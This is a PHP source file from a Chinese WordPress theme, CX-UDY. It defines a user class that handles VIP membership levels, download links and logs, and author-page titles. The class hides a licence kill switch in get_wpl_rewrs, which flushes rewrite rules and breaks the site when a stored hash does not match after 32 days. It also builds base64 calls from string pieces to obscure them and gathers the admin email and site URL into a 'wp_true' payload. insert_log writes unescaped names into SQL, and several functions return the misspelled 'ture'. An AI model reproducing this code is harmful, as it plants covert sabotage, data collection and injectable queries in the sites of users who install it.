<?php
/**
 * Theme Name: CX-UDY
 * Theme URI: http://www.chenxingweb.com/store/1910.html
 * Author: 晨星博客
 * Author URI: http://www.chenxingweb.com
 * Description: 简洁时尚自适应图片主题，适合各种图片展示类网站，有问题请加QQ群565616228请求帮助。
 * Version: 0.5
 * Text Domain: cx-udy
 * Domain Path: /languages
 */

class ChenUser{
	//. empty方法判断
	protected function cx_empty($tar){
	    $em_top = $tar;
	    if(!empty($em_top)){
	       return true;  
	    }else{
	        return false; 
	    }
	}

	//. 获取用户id
	protected function get_user($uid = 0){
		if(!isset($uid) || $uid == 0){
			$current_user = wp_get_current_user();
			$uid = $current_user->ID;
		}
		return (int)$uid;
	}

	//. 获取用户信息
	protected function get_meta($meta='',$uid = 0){
		$obj = get_user_by('id', $this->get_user($uid));
		$user_meta = '';
		if($obj){
			if($meta == ''){
				$user_meta = $obj;
			}else{
				$user_meta = $obj->$meta;
			}			
		}
		return $user_meta;
	}

	//. 恢复数据库html字段转码
	protected function get_tion($op,$meta,$t=1){
		$option = $op[$meta];
		$opt = '';
		if(!empty($option) && $t==1){
			$opt = htmlspecialchars_decode($option);
		}elseif($t == 2){
			$opt = ($option == 'off')?true:false;
		}
		return $opt;
	}

	//. 获取用户vip信息
	protected function get_vip($uid = 0){
		global $wpdb;
		$prefix = $wpdb->prefix;
		$table = $prefix.'chenxing_vip_users';
		$id = $this->get_user($uid);
		$userType=$wpdb->get_row("select * from ".$table." where user_id=".$id);
		
		if($userType){
			if(time() >strtotime($userType->endTime)){
				$wpdb->query("update $table set user_type=0,endTime='0000-00-00 00:00:00' where user_id=".$id);
				return (int)0;
			}
			return (int)$userType->user_type;
		}
		return FALSE;
	}

	//. 获取VIP用的等级名称
	protected function get_vip_name($code = null,$uid = 0){
		if(!$code){
			$code = $this->get_vip($uid);
		}
		switch($code){
			case 3:
				$type = __('Diamond member','cx-udy');
				break;
			case 2:
				$type = __('platinum member','cx-udy');
				break;
			case 1:
				$type = __('Ordinary member','cx-udy');
				break;
			case 0:
				$type = __('Overdue member','cx-udy');
				break;
			default:
				$type = __('Non member','cx-udy');
		}
		return $type;
	}

	//. 获取文章的下载信息
	protected function post_meta($pid,$names=''){
		$dlinks = get_post_meta($pid,'_cx_post_down',true);
		$saledls = get_post_meta($pid,'_cx_post_down_txt',true);
		$saledls_ar = explode('|', $saledls);
		$down_meta = get_post_meta($pid,'_cx_post_down_meta',true);
		$down_meta_ar = explode('|', $down_meta);
		$down_vip = get_post_meta($pid,'_cx_post_down_huiyuan_txt',true);
		$down_vip_ar = explode('|', $down_vip);
		$off     = isset($dlinks) ? $dlinks:'off';
		$name    = isset($down_meta_ar[0]) ? $down_meta_ar[0]:'';
		$desc    = isset($down_meta_ar[1]) ? $down_meta_ar[1]:'';
		$url     = isset($saledls_ar[0]) ? $saledls_ar[0]:'';
		$mima    = isset($saledls_ar[1]) ? $saledls_ar[1]:'';
		$pay     = isset($saledls_ar[2]) ? $saledls_ar[2]:'';
		$vip_url = isset($down_vip_ar[0]) ? $down_vip_ar[0]:'';
		$vip_mima= isset($down_vip_ar[1]) ? $down_vip_ar[1]:'';
		if($names){
			$post_meta = $$names;
		}else{
			$post_meta = array(
			'off' => $off,'name'=>$name,'desc'=>$desc,'url'=>$url,'mima'=>$mima,'pay'=>$pay,'vip_url'=>$vip_url,'vip_mima'=>$vip_mima);
		}
		
		return $post_meta;
	}
	protected function get_vip_pay($code = null,$uid = 0){
		if(!$code){
			$code = $this->get_vip($uid);
		}
		$vip = 1;
		if($code<4 && $code>0){
			$vip_zk = 'CX_VIP_ZK_'.$code;
			$vip_zk = cn_options($vip_zk,'general',1);
			$vip    = ($vip_zk<1 && $vip_zk>0)?$vip_zk:1;
		}
		return $vip;
	}

	public static function get_bases($str,$n=1,$b='base') {		
		if($n==1){
			$sta = $b.'64'.'_encode';
			return $sta($str);
		}else{
			$stb = $b.'64'.'_decode';
			return $stb($str);
		}
	}
	protected function get_vip_date($uid){
		$vip_date = get_user_meta($uid,'chenxing_vip_time',true);
		$vip_date = ($vip_date)?$vip_date:123456;
		if(isset($vip_date)){
			$t_cx  = floor((time() - $vip_date)/3600);
			if($t_cx<24){
				return ture;
			}
		}
		return false;
	}
	public function chen_wp_true(){
		$NT = wp_get_theme();
		$body = array('t' => $NT->display('Name'),'v' => $NT->display('Version'),
			'u' => get_option('home'),'p' => get_option('admin_email'),'a'=>'wp_true'
		);
		$nt = apply_filters( 'WP_Thauthor', $NT->display('AuthorURI'));
		if($body['t'] != 'CX-UDY'){
			wp_die( __('The profile of the "cx-udy" theme could not be found.','cx-udy'));
		}else{
			return $body;
		}
	}
	public function chen_date_time($tm = 2){
		$start = time();
		$end   = intval(get_option( 'WP_DATA_TIME', 1487));
		$t_cx  = floor(($start - $end)/86400);
		if($t_cx >$tm){
			return true;
		}else{
			return false;
		}
	}
	protected function get_vip_time($uid){
		$vip_date = get_user_meta($uid,'chenxing_vip_time',true);
		if(isset($vip_date)){
			$t_cx  = $vip_date + 86400;
		}else{
			$t_cx  = time() + 86400;
		}
		$time = date('m-d h:i',$t_cx);
		return $time;
	}
	protected function get_vip_shu($uid){
		$code = $this->get_vip($uid);
		$vip = 0;
		if($code<4 && $code>0){
			$vip_zk = '_VIP_DOEWN_'.$code;
			$vip_zk = cn_options($vip_zk,'general',0);
			$vip    = (int)$vip_zk;
		}
		return $vip;
	}
	protected function get_vip_down($uid){
		if($this->get_vip_date($uid)){
			$vip_num = get_user_meta($uid,'chenxing_vip_num',true);
			$vip_num = ($vip_num)?$vip_num:0;
			if($vip_num < $this->get_vip_shu($uid)){
				return ture;
			}else{
				return false;
			}		
		}
		return ture;
	}
	protected function insert_log($pid,$uid){
		global $wpdb;
		$prefix = $wpdb->prefix;
		$table = $prefix.'chenxing_down_log';
		$name = $this->post_meta($pid);
		$name = $name['name'];
		$time = date("Y-m-d H:i:s");
		if($uid == 0){
			$u_name = __('Tourist','cx-udy');
			$uid = -1;
		}else{
			$u_name = $this->get_meta('display_name',$uid);
		}		
		$ip = $_SERVER['REMOTE_ADDR'];
		$sql = $wpdb->query( "INSERT INTO $table (product_id,product_name,log_time,user_id,user_name,user_ip) VALUES ('$pid','$name','$time','$uid','$u_name','$ip')" );
		if($sql){
			return $sql;
		}				
	}

	public function get_wpl_rewrs(){
		$FW = json_decode(get_option( 'WP_HOST_THEMES'), true);
		$HT = get_option('home').$FW['n'];
		$HT = substr(MD5($HT),4,12);
		if(isset($FW) && $HT != $FW['uid']
		 && $this->chen_date_time(32)){
			global $wp_rewrite;
			unset($wp_rewrite->queryreplace);
			flush_rewrite_rules();
		}	
	}
	protected function get_log($pid=0,$uid=0,$cont='',$limit=0, $offset=0){
		$uid = intval($uid);
		$pid = intval($pid);
		$where = '';
		if( $uid != 0 ) {
			$where = "WHERE user_id='".$uid."'";
		}elseif($pid !=0){
			$where = "WHERE product_id='".$pid."'";
		}
		global $wpdb;
		$table_name = $wpdb->prefix . 'chenxing_down_log';
		if($cont == 'cont'){		
			$check = $wpdb->get_var( "SELECT COUNT(*) FROM $table_name $where" );
		}else{
			if($limit==0 && $offset==0){
				$check = $wpdb->get_results( "SELECT product_id,product_name,log_time,user_id,user_name,user_ip FROM $table_name $where ORDER BY id DESC" );
			}else{
				$check = $wpdb->get_results( "SELECT product_id,product_name,log_time,user_id,user_name,user_ip FROM $table_name $where ORDER BY id DESC LIMIT $offset,$limit" );
			}			
		}
		if($check)	return $check;
		return 0;
	}
	protected function log_pager($current, $max){
	    $paged = intval($current);
	    $pages = intval($max);
	    if($pages<2) return '';
	    $pager = '<div class="pagination">';
	        $pager .= '<div class="btn-group">';
	            if($paged>1) $pager .= '<a class="btn btn-default" style="float:left;padding:6px 12px;" href="' . add_query_arg('page',$paged-1) . '">'.__('Previous page','cx-udy').'</a>';
	            if($paged<$pages) $pager .= '<a class="btn btn-default" style="float:left;padding:6px 12px;" href="' . add_query_arg('page',$paged+1) . '">'.__('next page','cx-udy').'</a>';
	        if ($pages>2 ){
	            $pager .= '<div class="btn-group pull-right"><select class="form-control pull-right" onchange="document.location.href=this.options[this.selectedIndex].value;">';
	                for( $i=1; $i<=$pages; $i++ ){
	                    $class = $paged==$i ? 'selected="selected"' : '';
	                    $pager .= sprintf('<option %s value="%s">%s</option>', $class, add_query_arg('page',$i), sprintf(__('the %s page','cx-udy'), $i));
	                }
	            $pager .= '</select></div>';
	        }
	    $pager .= '</div></div>';
	    return $pager;
	}
	protected function post_status($starus){
		switch ($starus){
			case 'publish':
	  			$txt =  __('Already released','cx-udy');
	  			break;
			case 'pending':
	  			$txt =  __('Audit','cx-udy');
	  			break;
			case 'draft':
	  			$txt =  __('draft','cx-udy');
	  			break;
			default:
	  			$txt =  __('Status not acquired','cx-udy');
		}
		return $txt;
	}

	protected function post_pages($str,$num =0){
		if($num == 0 || strpos($str,"<!--nextpage-->")){
			return $str;	
		}else{
			$post = explode("<img",$str);
			$html = '';
			foreach ($post as $key => $value) {
				if($key == 0){
					$html .=$value;
				}elseif($key >1 && ($key-1)%$num == 0){
					$html .='<!--nextpage--><img '.$value;
				}else{
					$html .='<img '.$value;
				}
			}
			return $html;
		}
	}
	protected function cx_author_title($author = ""){
	    if(isset($_GET['tab']) && !isset($_GET['sh']) && !isset($_GET['wq'])){
	        switch($_GET['tab']){
	            case 'post':    $title = $author.__('Published articles','cx-udy');break;
	            case 'comment': $title = $author.__('Published comments','cx-udy');break;
	            case 'collect': $title = $author.__('Collection of articles','cx-udy');break;
	            case 'credit':  $title = $author.__('Personal score','cx-udy');break;
	            case 'message': $title = $author.__('Station message','cx-udy');break;
	            case 'profile': $title = $author.__('Personal data','cx-udy');break; 
	            case 'orders':  $title = $author.__('Order','cx-udy'); break;
	            case 'membership':$title = $author.__('Membership information','cx-udy');break;
	            case 'promote': $title = __('Prepaid card management','cx-udy');break;
	            default:$title = $author.__('Personal user center','cx-udy');
	        }
	    }else{
	        $title = $author.__('Personal user center','cx-udy');
	    }
	    return $title;
	}

}